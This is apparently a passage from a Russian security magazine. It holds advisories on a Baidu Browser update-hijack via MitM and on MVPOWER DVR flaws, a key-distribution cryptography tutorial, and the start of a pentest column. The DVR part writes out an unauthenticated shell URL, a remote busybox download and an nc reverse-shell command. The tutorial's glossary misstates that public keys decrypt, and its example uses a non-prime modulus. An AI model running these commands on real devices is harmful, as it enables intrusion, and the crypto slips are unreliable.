 Дата релиза: 27 февраля 2016 года
 Автор:          lifeform-labs
 CVE:         N/A

Все началось с поста на xda-developers, где были расписаны уязвимости
в браузере Baidu. Члены команды lifeform-labs решили показать пример того,
что эксплуатация не составляет особого труда. Браузер же очень популярен:
по данным Google Play, число загрузок составляет от десяти до пятидесяти
миллионов.
   Перед началом установки браузера автор запустил mitmproxy.





Процесс обновления T5Update APK

И что мы видим? APK загружается по протоколу HTTP:

GET http://s.mobile-global.baidu.com/mbrowser/guanxing/T5Update/
res/54b2672d5353481ab5a762bdcd74977f.apk

Если открыть предыдущий запрос, то мы увидим ответ JSON с адресом APK:
GET http://mobile-global.baidu.com/mbrowser/management/zeus_update.
do?si=12.1.0.0&so=6.2.7.11&zi=-&zo=-&api=1&pt=ma&co=US&la=en&ch=gp&
av=6.3.0.1&sv=a_19&pr=&n=

Ответ в JSON:





После успешной установки пользова-
тель увидит следующее сообщение.
   Что такое T5 Engine, нам не осо-
бенно важно (но если любопытно, то
знай: это дополнение, которое увели-
чивает скорость Baidu). Загрузим и его
для дальнейшего изучения:

wget http://s.mobile-global.baidu.
com/mbrowser/guanxing/T5Update/res
/54b2672d5353481ab5a762bdcd74977f.  Сообщение об успешной установке T5 Engine
apk
...
2016-02-27 12:56:21 (1.95 MB/s) — ‘54b2672d5353481ab5a762bdcd74977f.
apk’ saved [7819869/7819869]
Смотрим содержимое:

unzip -l 54b2672d5353481ab5a762bdcd74977f.apk
Archive:  54b2672d5353481ab5a762bdcd74977f.apk
  Length     Date   Time    Name
 --------    ----   ----    ----
    21704  03-24-15 14:32   libbaidujni.so
    99576  03-24-15 14:32   libdumper.so
    66748  03-24-15 14:32   libZeusPlatformImpl23.so
    66752  03-24-15 14:32   libZeusPlatformImpl40.so
    66752  03-24-15 14:32   libZeusPlatformImpl41.so
    66752  03-24-15 14:32   libZeusPlatformImpl42.so
    66756  03-24-15 14:32   libZeusPlatformImpl43.so
    66756  03-24-15 14:32   libZeusPlatformImpl443.so
    66756  03-24-15 14:32   libZeusPlatformImpl44.so
    66752  03-24-15 14:32   libZeusPlatform.so
 14495444  03-24-15 14:32   libzeus.so
   493810  03-24-15 14:33   com.baidu.zeus.jar
 --------                   -------
 15644558                   12 files

Все необходимые библиотеки загружаются по HTTP. Изучаем директорию
Baidu, чтобы понять, что и где расположено:

/data/data/com.baidu.browser.inter/files # ls -la
drwx------ u0_a151  u0_a151       2016-02-27 11:57 AFRequestCache
-rw------- u0_a151  u0_a151    33 2016-02-27 11:57 AF_INSTALLATION
drwx------ u0_a151  u0_a151       2016-02-27 11:57 bbm
-rw------- u0_a151  u0_a151 10453 2016-02-27 11:57 config_gb.json
drwx------ u0_a151  u0_a151       2016-02-27 11:57 cyber
drwx------ u0_a151  u0_a151       2016-02-27 11:57 data
drwx------ u0_a151  u0_a151       2016-02-27 11:57 deeplink
drwx------ u0_a151  u0_a151       2016-02-27 11:57 float_window
drwx------ u0_a151  u0_a151       2016-02-27 12:44 home
drwx------ u0_a151  u0_a151       2016-02-27 11:57 images
-rwxr-xr-x u0_a151  u0_a151 13592 2016-02-27 11:57 libprocmox_v1_4.
so
drwx------ u0_a151  u0_a151       2016-02-27 11:57 misc
drwx------ u0_a151  u0_a151       2016-02-27 11:57 plugin
drwx------ u0_a151  u0_a151       2016-02-27 11:57 pv
drwx------ u0_a151  u0_a151       2016-02-27 11:57 skin
drwx------ u0_a151  u0_a151       2016-02-27 11:57 splash
drwx------ u0_a151  u0_a151       2016-02-27 11:57 version
drwx--x--x u0_a151  u0_a151       2016-02-27 12:44 zeus

И в итоге находим нужную папку /files/zeus/lib/, куда складируется содер-
жимое APK:

/data/data/com.baidu.browser.inter/files/zeus/libs # ls -la
-rw-r--r-- u0_a151  u0_a151   1252704 2016-02-27 12:44 com.baidu.zeus.dex
-rw-r--r-- u0_a151  u0_a151    493810 2016-02-27 12:44 com.baidu.zeus.jar
-rw-r--r-- u0_a151  u0_a151     66752 2016-02-27 12:44 libZeusPlatform.so
...
-rw-r--r-- u0_a151  u0_a151     66756 2016-02-27 12:44 libZeusPlatform
Impl443.so
-rw-r--r-- u0_a151  u0_a151     21704 2016-02-27 12:44 libbaidujni.so
-rw-r--r-- u0_a151  u0_a151     99576 2016-02-27 12:44 libdumper.so
-rw-r--r-- u0_a151  u0_a151  14495444 2016-02-27 12:44 libzeus.so
-rw-r--r-- u0_a151  u0_a151        17 2016-02-27 12:44 ver.dat

Теперь у нас есть все, что требуется для успешной эксплуатации.

EXPLOIT
План следующий:
1. создать zip с библиотеками, которые мы нашли в T5Update APK;
2. заменить одну из библиотек нашей и упаковать в новый zip;
3. провести MitM атаку;
4. подставить наш файл вместо T5Update APK.

Проверим, какие библиотеки загружаются при запуске браузера:

D/dalvikvm(21640): Trying to load lib /data/data/com.baidu.browser.
inter/files/zeus/libs//libzeus.so 0x42775e38
D/dalvikvm(21640): Added shared lib /data/data/com.baidu.browser.
inter/files/zeus/libs//libzeus.so 0x42775e38

Нашей целью будет библиотека libzeus.so. Заменяем ее в созданном архи-
ве. Ниже представлен код новой библиотеки для выполнения нашего кода:
После этого создадим свой APK с поддельной libzeus.so:

unzip -l bad.apk
Archive:  bad.apk
  Length     Date   Time    Name
 --------    ----   ----    ----
   493810  03-24-15 14:33   com.baidu.zeus.jar
    21704  03-24-15 14:32   libbaidujni.so
    99576  03-24-15 14:32   libdumper.so
     9356  02-13-16 16:20   libzeus.so
    ...
    66756  03-24-15 14:32   libZeusPlatformImpl443.so

Теперь напишем небольшой скрипт mitmdump, который будет вставлять bad.
apk внутрь запроса загрузки T5Update APK:
Автор записал демо с примером успешной эксплуатации.

TARGETS
Baidu Browser for Android

SOLUTION
Производитель выпустил исправление.


МНОЖЕСТВЕННЫЕ УЯЗВИМОСТИ В DVR
MVPOWER 8 ДЛЯ CCTV
 CVSSv2:      N/A
 Дата релиза: 10 февраля 2016 года
 Автор:       Andrew Tierney
 CVE:         N/A

Камеры видеонаблюдения повсеместны, но их безопасность — под вопро-
сом. Исследователи из конторы PenTestPartners решили проверить их на проч-
ность, для чего выбрали одну из недорогих моделей DVR — Mvpower 8.
  В этой системе используется собственный веб-сервер — его можно по-
искать через Shodan по HTTP-заголовку JAWS/1.0. В результатах будет пере-
числено 44000 устройств с таким заголовком и «свободным» доступом. Боль-
шинство из них стоят в общественных местах.
Результаты поиска предположительно уязвимых устройств через Shodan

EXPLOIT
Начнем со стандартной уязвимости, которая частично относится к человече-
скому фактору. По умолчанию на таком устройстве для входа используется
пароль admin и пустой пароль. До сих пор многие после покупки и установ-
ки забывают поменять пароли (не говоря уже о логинах), и атакующий может
без проблем получить админский доступ к панели управления.
   Следующая уязвимость — это обход аутентификации. По задумке разра-
ботчиков, пользователь заходит на index.html, где вводит свои данные. Если
они правильные, то пользователя направляют на страницу view2.html.
  В случае попытки зайти сразу на страницу view2.html без установлен-
ных cookie на некоторое время мы увидим загруженную страницу и редирект
на index.html. Как оказалось, проверка осуществляется с помощью JavaScript
и проверяется только наличие cookie:
   Таким образом, в cookie можно написать что угодно, и получить доступ
к интерфейсу без знания правильного логина и пароля.





Установка cookie для обхода аутентификации в DVR

Получить полный доступ к веб-интерфейсу, конечно, интересно, но хотелось
бы полноценный шелл на устройстве. При исследовании был найден заголо-
вок J18. Это последовательный порт 115200. Но у него нет никакого вывода,
что не позволяет его нормально использовать.
  В устройстве используется загрузчик с открытым исходным кодом — uboot.
А саму загрузку можно прервать нажатием любой клавиши. Но на это есть
всего секунда :)
   После попадания в консоль можно изменить параметры загрузки, чтобы
пускало без пароля:




После этого DVR загрузится в режиме single user и у нас будет желаемый шелл.
Хотя и не удаленный.
   После анализа прошивки стало ясно, что большая часть функций хранится
в приложении dvr_app, включая веб-сервер. Для реализации веб-интерфей-
са используются скрипты /cgi-bin/*.cgi, но такой папки в файловой системе
не нашлось, а значит, dvr_app сам обрабатывает такие запросы. Подобное
поведение характерно для встраиваемых устройств.





 Установка cookie для обхода
 аутентификации в DVR



                                      Выполнение команды shell
                                       для выведения списка процессов


   После анализа строк из dvr_app были найдены не только cgi-скрипты,
но и другие интересные файлы. Авторы очень удивились, обнаружив встро-
енную команду moo. Но нам больше интересен шелл. Попробуем вывести
список процессов.
   Теперь у нас безо всякой авторизации есть удаленный шелл с правами ад-
министратора, который не документирован и, возможно, не отключаем.
   На устройстве также имеется telnet на 23 порту, правда, он требует пароль.
Но, так как у нас есть доступ к шеллу, описанный выше, то мы можем узнать
хеш пароля и расшифровать его.





Получаем хеш пароля DVR-устройства
Если же пароль долго не подбирается, то мы можем использовать шелл
для запуска нового telnet демона:

http://192.168.3.101/shell?/usr/sbin/telnetd -l/bin/sh -p 25





telnet доступ к DVR

Не у всех найденных устройствах наружу прокинуты какие-то порты, кроме
80, поэтому рассмотрим получение reverse shell.
  DVR использует busybox, но, увы, без любимого нами netcat. Но это можно
исправить! Скомпилируем новый busybox под используемый ARM процессор,
благо особых зависимостей netcat не требует.
   Наши дальнейшие действия таковы:
1. Найти директорию с возможностью записи. Вся файловая система устрой-
   ства смонтирована с правами только для чтения, чтобы нельзя было изме-
   нить пароль или добавить пользователя. Но используется дополнитель-
   ный жесткий диск для хранения данных — /root/rec/a1.
2. Загрузить с помощью wget новый скомпилированный busybox.
3. Сделать файл исполняемым.
4. Запустить netcat.

http://192.168.3.101/shell?cd /root/rec/a1
wget %68%74%74%70%3a%2f%2f%32%31%32%2e%31%31%31%2e%34%33%
2e%31%36%31%
2f%62%75%73%79%62%6f%78%20
chmod %2bx busybox
./busybox nc 1.2.3.4 8000 -e /bin/sh -e /bin/sh
URL должен быть закодирован.
   Теперь, зайдя на адрес http://1.2.3.4/busybox, мы получаем долгождан-
ный шелл.
  Помимо описанных выше уязвимостей у устройства есть еще ряд недостат-
ков:
•  нет CSRF защиты;
•  нет HTTPS;
•  нет защиты от брутфорса;
•  и многое другое.

Оригинальную версию статьи ты можешь прочитать на pentestpartners.com.

TARGETS
Mvpower 8 (возможно, уязвимы и другие версии)

SOLUTION
На момент написания статьи об исправлениях не было известно.
ВЗЛОМ
ПОГРУЖЕНИЕ
В КРИПТУ. ЧАСТЬ 2:
РАСПРЕДЕЛЕНИЕ
КЛЮЧЕЙ


ЧТО ТАКОЕ РАСПРЕДЕЛЕНИЕ
                                                                           Анастасия БересневаКЛЮЧЕЙ, ПОЧЕМУ ЭТО ТАК                      anastasiya3161@gmail.com
ВАЖНО И КАК ВЫБРАТЬ
КРИПТОСТОЙКИЙ КЛЮЧ?
Что такое шифрование без распределения ключей? Эти
понятия неотделимы. В современном мире криптографии
вопросу распределения ключей уделяется особое внима-
ние, ведь злоумышленники не дремлют. Во второй части
нашего ликбеза по криптографии мы доступно объясним,
как работает симметричное и асимметричное шифрова-
ние, как выбрать криптостойкий ключ, зачем и как проис-
ходит распределение, а также что такое удостоверяющие
центры и инфраструктура открытых ключей.

Roadmap

Это второй урок из цикла «Погружение в крипту». Все уроки цикла в хроноло-
гическом порядке:

• Урок 1. Исторические шифры. Основы и исторические шифраторы. Как ра-
   ботают (и анализируются) шифры сдвига, замены, Рихарда Зорге, шифр
  Вернама и выполняющие их шифровальные машины.
• Урок 2. Распределение ключей. Что это такое, как выполняется распреде-
   ление ключей и как выбрать криптостойкий ключ (ты здесь).
• Урок 3. Современные отечественные шифры. Что такое сеть Фейстеля
   и какими бывают отечественные блочные шифры, используемые в совре-
   менных протоколах: ГОСТ 28147—89, «Кузнечик».
• Урок 4. Современные зарубежные шифры. В чем разница между 3DES,
   AES, Blowfish, IDEA, Threefish от Брюса Шнайдера и как они работают.
• Урок 5. Электронная подпись. Виды электронных подписей, как они рабо-
   тают и как их использовать.
• Урок 6. Квантовая криптография. Что это такое, где используется и как по-
   могает в распределении секретных ключей. Генерация случайных чисел
   и электронной подписи.



ПОЧЕМУ РАСПРЕДЕЛЕНИЕ КЛЮЧЕЙ ТАК ВАЖНО?
В нашем арсенале уже имеется несколько алгоритмов шифрования. Как и го-
ворилось ранее, даже самые стойкие и продуманные шифры могут стать уяз-
вимыми, если неправильно выбрать ключ шифрования или позволить украсть
его злоумышленнику. Поэтому, чтобы шифрование действительно оправдало
ожидания и обеспечило секретность сообщения, нужно правильно выбрать
и заранее обговорить секретный ключ.

Глоссарий второго урока
•  Сессионный (сеансовый) ключ — применяется для одного сеанса связи.
   Уничтожается в короткий промежуток времени (от нескольких секунд до од-
   ного дня). Сеансовый ключ обеспечивает секретность одного диалога: если
   он попадет под угрозу, будет нарушена конфиденциальность одного сеан-
   са, но не всей системы в целом.
•  Долговременный ключ — используется в течение долгого периода време-
   ни (от нескольких часов до нескольких лет, в зависимости от назначения).
   Его компрометация ставит под угрозу всю систему и является большой
   проблемой.
•  Открытый ключ — применяется для расшифровки в асимметричных крипто-
   системах шифрования (то есть системах, где для шифрования и расшиф-
   ровки требуются разные ключи).
•  Секретный ключ — используется криптографическим алгоритмом при шиф-
   ровании/расшифровке сообщений и постановке цифровой подписи.
•  Распределение ключей — последовательность действий по выработке участ-
   никами общих ключей для осуществления криптографических операций.



   Чтобы лучше понять симметричное и асимметричное шифрование, давай
представим следующую ситуацию. Ты хочешь отправить секретное сообще-
ние с личными данными в банк. Для этого банк выдает тебе коробку и ключ.
Ты кладешь письмо в коробку и закрываешь ее на ключ, банк при получении
открывает эту коробку с помощью аналогичного ключа. Такой метод является
симметричным, так как обе стороны используют один и тот же ключ расшиф-
рования. Однако злоумышленник может перехватить ключ и открыть коробку.
Чтобы это предотвратить, банк поступает хитрее: он предоставляет тебе ко-
робку и навесной замок, а единственный ключ банк хранит у себя. Таким об-
разом, воспользоваться замком может кто угодно, но открыть коробку может
только обладатель ключа. Такой подход называется асимметричным: замок
играет роль открытого (публичного) ключа, а ключ банка — секретного (при-
ватного).
   Симметричное шифрование предусматривает шифрование и расшифро-
вание с помощью одного и того же секретного ключа, поэтому пользователям
важно правильно выработать совместный ключ, а также безопасно его пере-
дать. В условиях незащищенного канала это сделать очень сложно. Асимме-
тричное шифрование как раз решает эту проблему: операции шифрования
и расшифрования осуществляются с помощью разных ключей (открытого и се-
кретного). В этом случае обладателю пары ключей необходимо передать со-
беседнику только открытый ключ, единственного назначение которого — не-
обратимо зашифровать информацию, расшифровать которую сможет только
получатель с помощью приватного ключа.

Можно ли расшифровать сообщение публичным
(открытым) ключом обратно?
Нет. Давай рассмотрим простой пример, который лежит в основе алгоритма
RSA.
   Роль открытого ключа выполняет число d = 3 и модуль, которым будет про-
изведение простых чисел p = 5 и q =  2: 10 (5*2). Секретный ключ e выби-
рается в соответствии открытому: должно выполняться условие e*d ≡ 1(mod
(q-1)*(p-1)), то есть, в нашем случае, e*3 ≡ 1(mod 4*1) => e*3 ≡ 1(mod  4).
Первое подходящее число e = 3. Значение секретного ключа также (3,10).
   Предположим, мы хотим передать слово ЗАБЕГ:

-----------------------------
        | З | А | Б | Е | Г |
-----------------------------
№ буквы | 9 | 1 | 2 | 6 | 4 |
-----------------------------

Возведем в куб каждое из чисел:

--------------------------------------
(№ буквы)^3 | 729 | 1 | 8 | 216 | 64 |
--------------------------------------

И возьмем по модулю, который является произведением двух простых чисел:

---------------------------------------
(№ буквы)^3 mod10 | 9 | 1 | 8 | 6 | 4 |
---------------------------------------

Результат и будет шифротекстом для слова ЗАБЕГ. При расшифровании полу-
чатель выполнит аналогичные действия, а именно — возведет в куб каждое
число кода и возьмет результат по модулю 10:
------------------------------------------
(код)^3       | 729 | 1 | 512 | 216 | 64 |
------------------------------------------
(код)^3 mod10 | 9   | 1 | 2   | 6   | 4  |
------------------------------------------
буква         | З   | А | Б   | Е   | Г  |
------------------------------------------

Этот пример показывает, как шифр работает на очень маленьких числах.
При реальном практическом применении для получения модуля перемно-
жаются огромные простые числа: например, используются модули 512 или
1024 бита. Чтобы вычислить секретный ключ, модуль необходимо разложить
на простые множители. Это очень сложная задача, которая называется «за-
дача факторизации целых чисел». Именно поэтому перехват открытого клю-
ча не представляет никакой угрозы для приватности переписки. Распределе-
ние ключей — последовательность действий по выработке участниками общих
ключей для осуществления криптографических операций.



В случае симметричного шифрования перед собеседниками всегда стоят две
важные задачи:
•  выбор криптостойкого ключа;
•  распределение ключа (надежный обмен).
  В случае асимметричного шифрования возникает другая задача:
•  обмен собеседников открытыми ключами.

Иными словами, Алиса, обладая открытым ключом Боба, не может быть уве-
рена на 100%, что этот ключ принадлежит именно Бобу.
  Начнем с первого случая.

Выбор криптостойкого ключа
Стоит сразу раскрыть главный критерий стойкого ключа в симметричном шиф-
ровании: он должен быть случайным. Например, стойкость симметричного
шифра Вернама напрямую зависит от выбора ключа. Чем меньше связь меж-
ду символами ключа, чем больше его длина, тем выше его криптостойкость.
В идеале ключ представляет собой абсолютно случайную последователь-
ность с длиной не меньшей, чем у шифруемого текста. Такая длина необходи-
ма для того, чтобы исключить возможность брутфорса. К примеру, пин-коды
банковских карт (состоящие всего из 4 цифр) от такой атаки защищает только
ограничение банка на количество попыток ввода пароля; убери это ограниче-
ние, и подбор любого пин-кода займет не более пары часов.
Атаки по шифротексту


Случайная последовательность поможет защитить и от атаки по шифротексту.
Суть такой атаки заключается в том, что злоумышленник перехватывает необ-
ходимое количество шифротекстов и анализирует их с целью подобрать се-
кретный ключ. Пример — атака на шифр Вернама в предыдущей статье цикла.
   Если ты уверен, что твой ключ абсолютно случаен и подобная ситуация тебе
нипочем не страшна, рекомендую проверить его на соответствие требовани-
ям стандарта NIST. Если ключ не случайный, опытный криптоаналитик сможет
распознать алгоритм шифрования и, возможно, даже получить ключ. А уж если
ему в руки попадут еще и открытые тексты — пиши пропало.



В современных системах, чтобы сгенерировать случайную последователь-
ность для ключа, применяют различные подходы. Стандартные UNIX утилиты
random и urandom хэшируют данные, снимаемые со счетчика тактов процес-
сора во время аппаратных прерываний. Microsoft Crypto API берет хэш от вну-
треннего состояния компьютера — текущего времени, размера жесткого дис-
ка, размера свободной памяти, номера процесса и так далее. В ход также идут
всевозможные случайные данные. Например, в процессе оцифровки звуково-
го сигнала на линейный вход звуковой карты приходит аналоговый электриче-
ский сигнал, который содержит шум, состоящий из:
•  радиопомех и наводок от соседних устройств и радиоэфира;
•  помех электропитания;
•  теплового шума случайного движения электронов в компонентах электри-
   ческой схемы.

Используется и квантовый шум, который носит истинно случайный характер.
Квантовый шум «проникает» в цифровую часть звуковой карты, где его можно
сразу и использовать. Также нередко прибегают к помощи пользователя, тре-
буя набирать случайные символы на клавиатуре, двигать мышкой, пока идет
генерация сигнала, или произносить определенные слова.
   Теперь немного о времени жизни ключа. Для нас этот показатель очень ва-
жен — ведь чем дольше ключ находится в обращении, тем легче злоумышлен-
нику его получить и тем большую ценность этот ключ для него представляет.
С самого момента генерации секретного ключа нужно задуматься, как часто
его нужно менять. Кроме того, важный момент — уничтожение секретного
ключа. Если речь идет о сессионном ключе, его стоит безвозвратно уничто-
жить сразу по окончании сеанса связи. Если речь о долговременном — пусть
живет указанный срок, но, опять же, ни секундой дольше.
  Сессионные ключи, несмотря на их недолгий срок службы, играют важную
роль. Они используются повсеместно, начиная от защищенной TLS сессии
и заканчивая прикладными программами (например, мессенджерами). Также
сессионные ключи применяются при входе в личный кабинет интернет-банка
и иных подобных сервисах, где речь идет об особо важных данных и ключи
важно менять как можно чаще.

Распределение ключей (надежный обмен ключами)
Другой важной задачей симметричной криптографии помимо выбора супер-
стойкого ключа является распределение ключей — надежный и защищенный
от перехвата способ обмена ключами.
  При симметричном шифровании и выработке совместного ключа со своим
товарищем сложные схемы ни к чему — можно использовать простой алго-
ритм Диффи-Хеллмана:
1. Я и мой товарищ знаем два абсолютно несекретных числа g и p. Я приду-
  мываю большое число a, а мой товарищ большое число b.
2. Я вычисляю A = g^a mod p и отправляю товарищу.
3. Товарищ вычисляет B = g^b mod p и отправляет мне.
4. Я вычисляю B’ = B^a mod p = g^(ab) mod p.
5. Товарищ вычисляет A’ = A^b mod p = g^(ab) mod p.

В итоге, A’ = B’ и есть согласованный ключ.
   Рассмотрим пример на небольших числах. Пусть g = 2, p = 100, мое число
a = 4, а число товарища b = 2:

A = 2^4 mod 100 = 16
B = 2^2 mod 100 = 4
A’ = B^a =4^4 mod 100 = 56
B’ = A^b = 16^2 mod 100 = 56

Если использовать достаточно большие числа a, b и p, шансов получить ключ
у злоумышленника будет очень мало.
   Протокол Диффи-Хеллмана в чистом виде сейчас, разумеется, нигде не ис-
пользуется. Однако многие протоколы аутентификации построены на его осно-
ве: модификации обмена ключами Диффи-Хеллмана можно встретить и в се-
тевых протоколах, таких как IPSec и TLS, и в отдельных криптографических
приложениях.
  А как передать ключ?
  На первый взгляд, очевидно, физическим способом — нанять курьера
и приставить к нему охрану. Или, например, отправить по почте России пись-
мом первого класса. Послать сову, в конце концов. Вариантов много. Однако,
если у вас не один друг или не один пользователь криптографической системы,
такой метод невыгоден и неудобен. А уж если кто-то из них живет, например,
в Австралии, ждать ему придется довольно долго. В масштабах современного
мира такой вариант все еще возможен, но абсолютно неудобен. Криптографы
долго думали, как избавиться от курьера, и решили, что неплохо было бы раз-
работать специальные протоколы для распределения ключей.
  Для знакомства с протоколами распределения ключей представим, что не-
кой криптографической системой пользуются несколько участников. Они до-
говорились о том, как должен выглядеть ключ шифрования, и каждый генери-
рует его для себя особым методом. Но тут один пользователь сказал другому
(по секрету), что в системе есть нечестный участник. Каждый пользователь
начал подозревать своих товарищей... и в результате ключами больше никто
не обменивается.
  Для решения этой проблемы — общения в условиях недоверенности —
большинство протоколов распределения ключей предусматривает наличие
«центра доверия». Обычно это некий центральный сервер, которому доверяют
все пользователи, используя его для получения ключей и обмена ими между
собой при необходимости. Конечно, если есть возможность обменяться клю-
чами напрямую по абсолютно доверенному протоколу, будучи уверенным, что
ключ принадлежит именно твоему собеднику, можно обойтись и без УЦ. В ре-
альной жизни такие ситуации, к сожалению, почти не встречаются.
  Далее в тексте мы будем рассматривать только протоколы, в которых участ-
ники сообщаются единым центром доверия.

Протокол широкоротой лягушки
Первым протоколом для обмена секретными ключами в симметричных крипто-
системах, с которым мы познакомимся, будет протокол широкоротой лягушки.
Рассмотрим его на примере пользователей A и B, которые хотят обменяться
ключами друг с другом. Каждый из них для связи с центром доверия S имеет
ключ Ka и Kb соответственно. Порядок действий будет выглядеть следующим
образом.
1. А генерирует ключ K для связи с В и отправляет в центр доверия сообще-
   ние (K,T), зашифрованное на его ключе Ka (где Т — временная метка).
2. Сервер проверяет временную метку и расшифровывает сообщение, если
   метка соответствует текущему времени.
3. S шифрует ключ K на ключе Kb, прикрепляет временную метку и отправляет B.
4. B получает сообщение, проверяет метку и извлекает ключ K.
Схема работы протокола
широкоротой лягушки

Протокол очень прост и основан на синхронизации часов всех участников,
за которую несет ответственность доверенный центр. Однако на практике этот
протокол используется мало, потому что ответственность за генерацию сес-
сионного ключа лежит на плечах самих участников, а кто знает, что они там
нагенерируют?
   Протокол широкоротой лягушки использует концепцию единого центра до-
верия. Такой подход к управлению ключами применим и для асимметричной
криптографии. Удостоверяющий центр лежит в основе известной и самой ис-
пользуемой на данный момент инфраструктуры управления открытыми клю-
чами — PKI.

Инфраструктура открытых ключей (PKI)
Приступим к основной проблеме в асимметричном шифровании — как узнать
наверняка, кому принадлежит открытый ключ. Решением этой задачи является
инфраструктура открытых ключей, с которой мы сейчас и разберемся.
   Что же это за инфраструктура такая? PKI (Public Key Infrastructure) — это
современная система управления криптографической защитой, в том числе
и в среде, которая кишит злоумышленниками (например, в интернете). Ин-
фраструктура открытых ключей оперирует понятием «сертификата», который
содержит открытый ключ пользователя и идентифицирующую этого пользо-
вателя информацию. Задачей PKI является определение политики выпуска
электронных сертификатов: их выдача, аннулирование и хранение информа-
ции, необходимой для последующей проверки правильности сертификатов.
В число приложений, поддерживающих PKI, входят: защищенная электронная
почта, протоколы платежей, электронные чеки, электронный обмен инфор-
мацией, защита данных в сетях с протоколом IP, электронные формы и доку-
менты с электронной цифровой подписью. Одним словом, куда в интернете
не глянь — наткнешься на PKI.
   Ты приходишь в доверенный центр и получаешь сертификат (иначе говоря,
открытый ключ), который можешь использовать по назначению. Далее ты от-
правляешь этот сертификат своим товарищам, чтобы они могли подтвердить
твою личность. В этом сертификате указывается время получения, время ис-
течения сертификата и информация о владельце. Подразумевается, что сер-
тификат ты будешь предъявлять до тех пор, пока не истечет указанный срок.
PKI предусматривает как документацию, так и набор прикладных программ
для управления сертификатами. Документация определяет необходимый жиз-
ненный цикл каждого сертификата — время жизни, условия отзыва, хранение,
передачу. Прикладные программы, в свою очередь, реализуют манипуляции
с сертификатами на практике. Чтобы посмотреть пример сертификата, можно
обратиться к сетевым протоколам, аутентификация в которых происходит за-
частую как раз на основе сертификатов PKI.





Данные об УЦ можно узнать из информации о сертификате
При любом подключении к сайту по https наш браузер про-
веряет сертификат, смотрит на время истечения и только
тогда разрешает защищенное соединение.

Kerberos                                                        INFO
В 1987 г в Массачусетском технологическом институте
был разработан еще один интересный протокол аутен-    Если тебе интересно,
тификации: Kerberos. Сейчас эта система общедоступна       как работать с PKI
                                                                             на прикладноми ее реализации используются в различных операционных                                                                                 уровне, обязатель-
системах, в том числе и в Windows, как метод аутентифика-      но прочти статью
ции пользователей в домене. Существует несколько open      «Открытые ключи
                                                                            для серьезных паца-source реализаций протокола Kerberos: например, ориги-                                                                               нов» в рубрике «КО-
нальная MIT Kerberos и Heimdal. Такое многообразие воз-                                                                   ДИНГ» этого номера.
никло из-за ограничений США на экспорт криптографиче-     В статье показано,
ских средств защиты информации. На сегодняшний день       как реализовать
                                                                           на C# основные опе-
волнения вокруг MIT Kerberos уже улеглись.                                                                             рации: проверку под-
   Суть Kerberos состоит в следующем. Предполагается,      писи, шифрование
что компьютерная сеть состоит из клиентов и сервера,      и расшифрование
                                                                                в контексте PKI.причем клиентами могут быть программы и специальные
службы. Kerberos хранит центральную базу данных, вклю-
чающую как клиентов, так и их секретные ключи, на центральном сервере, ко-
торый называется KDC (Key Distribution Center). Цель системы — идентифика-
ция клиентов и генерирование для них сеансовых ключей.
   Как это работает?
Предположим, клиент A хочет получить доступ к ресурсам клиента B.
1. A заходит на сервер аутентификации Kerberos, используя свой пароль.
2. Сервер выдает ему сертификат, зашифрованный с помощью этого пароля.
   Сертификат содержит сеансовый ключ К.
3. А использует К для получения второго сертификата, предназначенного
   для установления соединения с В. У второго сертификата обозначено вре-
  мя жизни и временная метка, он зашифрован на ключе B.
4. Чтобы убедиться в том, что сертификат валидный, А отправляет В зашиф-
   рованную на сеансовом ключе временную метку.
5. B проверяет метку, инкрементирует ее и отправляет A (опять же шифруя
   на сеансовом ключе), таким образом подтверждая, что тоже имеет ключ
   доверенного центра и готов к сеансу связи.
6. А предъявляет свой сертификат B. B расшифровывает сертификат, прове-
   ряет его и подтверждает установку соединения.
                                                       Cхематичное представление
                                                     принципа работы Kerberos


Систему Kerberos версии 5 поддерживает множество Unix-подобных систем:
FreeBSD, Apple’s Mac OS X, Red Hat Enterprise Linux, Oracle’s Solaris, IBM’s AIX
и Z/OS и так далее. При желании можно настроить аутентификацию Kerberos
5 внутри сети организации с использованием смарт-карт или сертифика-
тов. Kerberos можно нередко встретить там, где происходит аутентифика-
ция в сети: так, например, Windows использует Kerberos при аутентификации
в Active Directory и защищенном обновлении DNS адресов. IP-sec хосты тоже
порой аутентифицируют друг друга через Kerberos.

ЗАКЛЮЧЕНИЕ
Правильный ключ — это главная проблема криптографии. Нужно всегда пом-
нить, что даже самый стойкий шифр потеряет смысл, если не подумать о слу-
чайности, длине, времени жизни и распределении ключа.
  В следующих статьях мы рассмотрим шифры, в которых применяются сер-
тификаты PKI и открытые ключи.
ВЗЛОМ: Колонка Юрия Гольцева
  ОШИБКИ
 ПЕНТЕСТЕРА,
 УЖАСНЫЕ И НЕ ОЧЕНЬ





                  Юрий Гольцев
                                                      @ygoltsev


Тестирование на проникновение (penetration testing) —
метод оценки безопасности компьютерных систем или
сетей средствами моделирования атаки злоумышленни-
ка. Для кого-то это хобби, для кого-то — работа, для кого-
то — стиль жизни. На страницах нашего журнала мы
постараемся познакомить тебя с профессией настоящего
хакера на службе корпорации, с задачами, которые перед
ним ставятся, и решениями этих задач.
INTRO
Каждый пентестер, если вдруг не передумает по дороге, проходит путь
от pentest monkey до Advanced — именно так, с большой буквы. И, конечно,
каждый на этом пути совершает ошибки, большие и маленькие. Их корень
чаще всего лежит в отсутствии опыта и знаний в предметной области. В своей
практике я встречаю много пентестерских ошибок, и большинства из них мож-
но было бы избежать, руководствуясь лишь одним принципом: «делай только
то, в чем уверен».

АГРЕССИВНЫЙ ARP SPOOFING
В тестировании на проникновение нередко приходится прибегать к атакам ка-
нального уровня, таким как ARP spoofing. Эта атака до сих пор эффективна,
если нет соответствующей защиты. Как ты наверняка понял, атаки канального
уровня обычно используются на этапе внутреннего тестирования на проник-
новение.
   Находясь со своим ноутбуком в офисе заказчика, многие не брезгуют от-
равлять ARP кэш сразу целым диапазоном /24, а то и /23. И если ноут не справ-
ляется с нагрузкой, можно воспользоваться физическим доступом. Да-да, ни-
кто не отменял атаки на канальный уровень в том случае, если ты, преодолев
сетевой периметр заказчика, развиваешь атаку внутри сети. Тогда, запустив
ettercap/cain/intercepter-ng на захваченном хосте, можно круто обломать-
ся и навсегда потерять доступ не только к хосту, но и к сети.
   Причины просты — тормоза на уровне сети возникнут не только у тебя,
но и у легитимных пользователей. Это заметят администраторы, которых на-
верняка в крайне строгой форме попросят объяснить, почему и как произо-
шел подобный инцидент. С большой вероятностью точку входа во внутреннюю
сеть закроют, пентест или атака перестанет быть секретом, администраторы
будут внимательнее — и это все не говоря об организационной составляю-
щей вопроса, ведь подобные действия серьезно мешают доступу к ресурсам.
   Кейс кажется фантастикой? Как бы не так. Когда я был начинающим пен-
